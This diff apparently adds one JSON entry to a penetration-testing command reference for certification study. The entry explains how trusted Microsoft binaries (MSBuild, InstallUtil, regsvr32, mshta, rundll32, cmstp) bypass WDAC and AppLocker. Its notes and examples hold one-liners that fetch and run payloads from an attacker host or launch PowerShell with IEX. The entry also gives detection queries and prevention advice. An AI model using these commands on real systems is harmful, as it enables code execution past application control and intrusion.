@@ -1,0 +1,100 @@
+{
+  "id": "ad-wdac-bypass",
+  "name": "WDAC/AppLocker Bypass - Application Control Evasion",
+  "command": "MSBuild.exe payload.xml",
+  "description": "Windows Defender Application Control (WDAC) and AppLocker restrict which executables can run. Bypasses abuse trusted Microsoft-signed binaries (LOLBins) that can execute arbitrary code: MSBuild.exe (XML payloads), InstallUtil.exe (.NET assemblies), Regsvr32.exe (scriptlets), MSHTA.exe (HTA files), and more. These binaries are allowed by default in most policies.",
+  "platform": "windows",
+  "type": "command",
+  "opsec": "moderate",
+  "category": "Post-Exploitation",
+  "subcategory": "Defense Evasion",
+  "certifications": [
+    "CRTP",
+    "CPTS"
+  ],
+  "primary_cert": "CRTP",
+  "source": "CRTP evasion module; LOLBAS project",
+  "tags": [
+    "wdac",
+    "applocker",
+    "bypass",
+    "lolbin",
+    "msbuild",
+    "installutil",
+    "application-control",
+    "evasion"
+  ],
+  "mitre": [
+    "T1127.001",
+    "T1218"
+  ],
+  "exam": "exam-ok",
+  "notes": "=== MSBUILD.EXE (most reliable) ===\n  # Create payload.xml with inline C# task:\n  # (Contains shellcode runner or reverse shell)\n  C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\MSBuild.exe payload.xml\n\n=== INSTALLUTIL.EXE ===\n  # Compile .NET assembly with [System.ComponentModel.RunInstaller(true)]\n  C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\InstallUtil.exe /logfile= /LogToConsole=false /U payload.dll\n\n=== REGSVR32.EXE (scriptlet) ===\n  regsvr32 /s /n /u /i:http://<attacker>/payload.sct scrobj.dll\n\n=== MSHTA.EXE ===\n  mshta http://<attacker>/payload.hta\n  mshta vbscript:Execute(\"CreateObject(\"\"Wscript.Shell\"\").Run \"\"powershell -ep bypass -c IEX(...)\"\":close\")\n\n=== RUNDLL32.EXE ===\n  rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication \";document.write();h=new%20ActiveXObject(\"WScript.Shell\").Run(\"powershell -ep bypass -c IEX(...)\")\n\n=== CMSTP.EXE ===\n  cmstp.exe /ni /s payload.inf\n\n=== WDAC vs APPLOCKER ===\n  AppLocker: User-mode only, easier to bypass\n  WDAC: Kernel-enforced, harder but still bypassable via LOLBins\n  Both trust Microsoft-signed binaries by default\n\n=== LOLBAS PROJECT ===\n  Full list of Living Off The Land Binaries:\n  https://lolbas-project.github.io/",
+  "examples": [
+    {
+      "label": "MSBuild.exe bypass",
+      "command": "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\MSBuild.exe payload.xml"
+    },
+    {
+      "label": "InstallUtil.exe bypass",
+      "command": "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\InstallUtil.exe /logfile= /LogToConsole=false /U payload.dll"
+    },
+    {
+      "label": "Regsvr32 scriptlet bypass",
+      "command": "regsvr32 /s /n /u /i:http://attacker.com/payload.sct scrobj.dll"
+    }
+  ],
+  "references": [
+    {
+      "title": "LOLBAS Project",
+      "url": "https://lolbas-project.github.io/"
+    },
+    {
+      "title": "MITRE T1127.001 - MSBuild",
+      "url": "https://attack.mitre.org/techniques/T1127/001/"
+    },
+    {
+      "title": "MITRE T1218 - System Binary Proxy Execution",
+      "url": "https://attack.mitre.org/techniques/T1218/"
+    }
+  ],
+  "recommended": [
+    {
+      "id": "ps-downgrade-attack",
+      "note": "PowerShell downgrade bypasses AMSI; LOLBins bypass AppLocker/WDAC.",
+      "rel": "alternative"
+    }
+  ],
+  "defense": {
+    "why_it_works": "Microsoft-signed binaries (MSBuild, InstallUtil, etc.) are trusted by default in WDAC/AppLocker policies. These binaries have legitimate functionality that can be abused to execute arbitrary code.",
+    "prerequisites": "Access to execute LOLBins on the target (usually available by default).",
+    "impact": "Execution of arbitrary code despite application control policies; defense evasion.",
+    "detection": "[MITRE T1218] Process creation of LOLBins with unusual arguments; MSBuild/InstallUtil loading suspicious XML/DLL files.",
+    "artifacts": "Sysmon Event 1 for MSBuild/InstallUtil with unusual command lines; .NET assembly loading events; network connections from LOLBins.",
+    "splunk_spl": "index=sysmon EventCode=1 (Image=\"*MSBuild.exe\" OR Image=\"*InstallUtil.exe\" OR Image=\"*regsvr32.exe\" OR Image=\"*mshta.exe\" OR Image=\"*cmstp.exe\")\n| where NOT match(ParentImage, \"(?i)devenv|visual studio\")\n| table _time, User, Image, CommandLine, ParentImage",
+    "elastic_kql": "process.name:(\"MSBuild.exe\" OR \"InstallUtil.exe\" OR \"regsvr32.exe\" OR \"mshta.exe\" OR \"cmstp.exe\")",
+    "sentinel_kql": "DeviceProcessEvents\n| where FileName in~ (\"MSBuild.exe\", \"InstallUtil.exe\", \"regsvr32.exe\", \"mshta.exe\", \"cmstp.exe\")\n| where InitiatingProcessFileName !in~ (\"devenv.exe\", \"explorer.exe\")\n| project Timestamp, DeviceName, AccountName, FileName, ProcessCommandLine",
+    "sigma_rules": "proc_creation_win_lolbin_execution",
+    "prevention": "Block LOLBins via WDAC managed installer rules; use strict allowlisting; monitor LOLBin execution with Sysmon; implement ASR rules for Office/script blocking.",
+    "sources": [
+      "CRTP evasion module",
+      "https://attack.mitre.org/techniques/T1218/"
+    ],
+    "detections": [
+      {
+        "platform": "sentinel",
+        "name": "LOLBin execution for application control bypass",
+        "logic": "DeviceProcessEvents\n| where FileName in~ (\"MSBuild.exe\", \"InstallUtil.exe\", \"regsvr32.exe\", \"mshta.exe\", \"cmstp.exe\", \"rundll32.exe\")\n| where ProcessCommandLine has_any (\".xml\", \".sct\", \"/U\", \"/i:http\", \"javascript:\", \"vbscript:\")\n| project Timestamp, DeviceName, AccountName, FileName, ProcessCommandLine, InitiatingProcessFileName",
+        "data_source": "defender-endpoint",
+        "attack": [
+          "T1127.001",
+          "T1218"
+        ],
+        "fidelity": "behavioral",
+        "confidence": "high",
+        "false_positives": "Legitimate MSBuild for .NET compilation; InstallUtil for service installation",
+        "tuning": "Whitelist developer workstations for MSBuild; alert on any LOLBin with network or script arguments"
+      }
+    ]
+  }
+}
